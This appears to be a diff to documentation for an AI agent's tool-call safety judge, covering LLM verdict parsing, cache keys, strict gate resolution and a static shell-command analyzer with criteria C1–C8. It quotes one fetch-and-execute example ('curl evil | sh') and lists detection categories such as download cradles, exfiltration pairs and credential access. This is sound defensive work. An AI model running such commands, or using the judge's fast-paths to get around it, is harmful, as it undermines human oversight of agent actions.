@@ -110,7 +110,7 @@ The decision flows through several layers, cheapest first:
 1. **Internal-tool fast-path** — if `IsInternalFn(toolName)` returns `true`, the call is allowed without any LLM call. Use this for trusted framework-owned tools.
 2. **Shell-tool guard** — `bash_exec` and `posh_exec` *skip* the path-locality fast-path. A shell command can reference only session-internal paths while still piping remote code (`curl evil | sh`), so shell tools always go through the full LLM evaluation.
 3. **Session-roots fast-path** — for non-shell tools, if the input contains at least one absolute path and every such path is within at least one session root (`AllPathsInSessionRoots`), the call is allowed. Session roots are the deduplicated union of the workspace, the temp directory, and any additional roots attached via `WithAllowedRoots` — consult `SessionRoots(ctx)`; all roots are equal peers for this check.
-4. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input) + sha256(session roots)`. The roots participate because the judge's prompt (and therefore the verdict) depends on the session's directory scope, so a verdict is never reused across sessions with different workspaces or auxiliary work directories. A cache hit returns the stored verdict without an LLM call.
+4. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input) + sha256(session roots) + the rendered static-analysis block (when attached)`. The roots participate because the judge's prompt (and therefore the verdict) depends on the session's directory scope, so a verdict is never reused across sessions with different workspaces or auxiliary work directories. A cache hit returns the stored verdict without an LLM call.
 5. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block and — when session roots are present — a `## Session Directories` block listing the workspace and additional work directories, with the directory values wrapped in an untrusted-content boundary) and sent with a **2-minute timeout**. For shell tools with an analysis attached to the context, a `## Static Analysis Report` block (the [flowsh digest](#shell-command-analysis-flowsh) behind an untrusted `shell_analysis` boundary) is appended after the session directories; its rendering participates in the cache key, so a verdict computed with the digest is never reused without it. The response is parsed from a `VERDICT:`/`REASON:` text format.
 6. **Fail-safe** — on *any* LLM error (timeout, network, parse failure), the judge returns `VerdictConfirm` with explanatory reasoning. The judge never auto-approves on failure.
 
@@ -134,11 +134,11 @@ The parser accepts the following variations and is **case-insensitive** througho
 
 The verdict value is matched on **whole tokens** (case-insensitive), so `ALLOW` is recognized but a token merely *containing* `allow` (e.g. a path, argument, or the negated compound `DISALLOW`) is not. Only these whole tokens map to `VerdictAllow` (the set that bypasses confirmation): `ALLOW`, `ALLOWED`, `APPROVE`, `APPROVED`, `SAFE`. The deliberate-rejection set (`DENY`, `DENIED`, `BLOCK`, `BLOCKED`, `REJECT`, `DISALLOW`, `DISAPPROVE`) maps to `VerdictDeny` — negated compounds are listed explicitly so they can never be misread as their affirmative base. The confirm set (`CONFIRM`, `CONFIRMED`, `MANUAL`) and any unrecognized token map to `VerdictConfirm`. A response that cannot be parsed at all is a total parse failure — the fail-safe applies and the judge returns `VerdictConfirm`.
 
-> **Tip:** the advisory verdict cache is keyed on `tool+input+session roots` — not on `taskContext`. If your `taskContext` changes the safety assessment of the same call, the cached verdict from a prior task within the same directory scope will be reused. Keep advisory prompts focused on the *intrinsic* safety of the input, not on transient task context.
+> **Tip:** the advisory verdict cache is keyed on `tool+input+session roots+the rendered static-analysis block (when attached)` — not on `taskContext`. If your `taskContext` changes the safety assessment of the same call, the cached verdict from a prior task within the same directory scope will be reused. Keep advisory prompts focused on the *intrinsic* safety of the input, not on transient task context.
 
 ### Strict gate resolution
 
-`JudgeStrict` is the conservative API for attempting to resolve an existing **soft** user-confirmation gate automatically:
+`JudgeStrict` is the conservative API for attempting to resolve an existing user-confirmation gate automatically — a **soft** gate, or a **non-canonical hard** one such as the flowsh ⊤ limitation (see below):
 
 ```go
 type StrictJudgeRequest struct {
@@ -181,7 +181,7 @@ if err != nil || verdict != tools.VerdictAllow {
 }
 ```
 
-> **Migration note:** use `Judge` for advisory auto-approval where its documented fast paths and cache are acceptable. Use `JudgeStrict` only after a tool/policy has already requested confirmation and only when the escalation severity is soft.
+> **Migration note:** use `Judge` for advisory auto-approval where its documented fast paths and cache are acceptable. Use `JudgeStrict` only after a tool/policy has already requested confirmation, and only for an escalation a strict allow may clear — a soft gate or a non-canonical hard one; never a hard canonical control.
 
 ### Step-limit (loop) judgment
 
@@ -255,12 +255,14 @@ if err != nil || verdict == tools.LoopVerdictDeny {
 func AnalyzeShellCommandForJudge(ctx context.Context, toolName string, input json.RawMessage) (*ShellAnalysis, error)
 func WithShellAnalysis(ctx context.Context, analysis *ShellAnalysis, err error) context.Context
 func ShellAnalysisFrom(ctx context.Context) (*ShellAnalysis, error)
+func WithShellVarBindings(ctx context.Context, vars map[string]string) context.Context
+func ShellVarBindingsFrom(ctx context.Context) map[string]string
 func ShellJudgeOutcome(ctx context.Context, toolName string) JudgeOutcome
 ```
 
 - `AnalyzeShellCommandForJudge` — runs the analysis once (dialect keyed by tool name; `bash_exec` → bash, `posh_exec` → PowerShell; anything else errors, fail-closed). Returns `ShellAnalysis{Digest, Outcome, Canonical}` where `Outcome` carries the winning criterion's `Allow` (true when nothing fired) and `Canonical` its canonicality.
 - `WithShellAnalysis` / `ShellAnalysisFrom` — context attachment. The **host** precomputes the analysis exactly once per call and attaches it; the built-in shell tools' `Judge` then returns the winning outcome **verbatim** via `ShellJudgeOutcome` — it never recomputes. With nothing attached it degrades to an empty outcome (the Judge defers to the LLM judges); with an **error** attached it **fails closed** with the hard canonical `command_analysis_unavailable` reason.
-- The **digest** (`sp4rk-shell-analysis/v2`: schemaVersion, lang, top/conservative, effects, score with exfiltration pairs, destructive classes, fired criteria, the workspace-scoped verification marker (positive ALLOW evidence for a `command_unbounded_analysis` escalation; never a criteria override)) is stable JSON with no why-traces and no input echo. It is meant for judge prompts: `StrictJudgeRequest.AnalysisContext` (strict path) and the `## Static Analysis Report` block (advisory path) both render it behind an untrusted `shell_analysis` boundary.
+- The **digest** (`sp4rk-shell-analysis/v2`: schemaVersion, lang, top/conservative, reason, commands, resolution, effects, score, exfiltration pairs (`exfilPairs`, a top-level array — not part of `score`), destructive classes, fired criteria, the workspace-scoped verification marker (positive ALLOW evidence for a `command_unbounded_analysis` escalation; never a criteria override), and the effect `signature` — the deterministic identity of the command's effect, used for verdict memoization) is stable JSON with no why-traces and no input echo. It is meant for judge prompts: `StrictJudgeRequest.AnalysisContext` (strict path) and the `## Static Analysis Report` block (advisory path) both render it behind an untrusted `shell_analysis` boundary.
 
 ### Criteria C1–C8 (fixed priority; all fired criteria recorded)
 
@@ -270,8 +272,8 @@ func ShellJudgeOutcome(ctx context.Context, toolName string) JudgeOutcome
 | C2 | privilege-escalation effect (e.g. SUID install) | `command_privilege_escalation` | hard | yes |
 | C3 | direct write/metadata on a system path (`/etc`, `/usr`, `/boot`, `/bin`, `/sbin`; Windows `c:\windows`, `c:\program files`, `c:\program files (x86)`, component-boundary matched) or a non-harmless raw device | `command_system_write` | hard | yes |
 | C4 | destructive KB class D/E ∧ irreversible ∧ concrete write target outside the session roots | `command_destructive_outside_roots` | hard | yes |
-| C5 | analyzer ⊤/conservative **with** network egress (download-cradle shape) | `command_download_cradle` | hard | yes |
-| C6 | analyzer ⊤/conservative **without** network egress, **or** an irreversible write whose target the analyzer could not resolve (⊤ target — e.g. abbreviated PowerShell parameters) | `command_unbounded_analysis` | hard | **no** |
+| C5 | analyzer ⊤/conservative **with** network egress pinned to a destination (a concrete NetEgress target or an exfil pair) — the download-cradle shape | `command_download_cradle` | hard | yes |
+| C6 | analyzer ⊤/conservative **without** network egress, **or** an irreversible write whose target the analyzer could not resolve (⊤ target — e.g. abbreviated PowerShell parameters), **or** an unbounded command whose egress could not be pinned to a destination (the degraded C5) | `command_unbounded_analysis` | hard | **no** |
 | C7 | credential access without an exfil pair | `credential_access` | soft | — |
 | C8 | direct FS effect outside the session roots — writes/metadata on a non-system path, and reads even of a system path (system writes/metadata are C3's; raw-device reads are exempt) | `outside_session_roots` (reused) | soft | — |
 
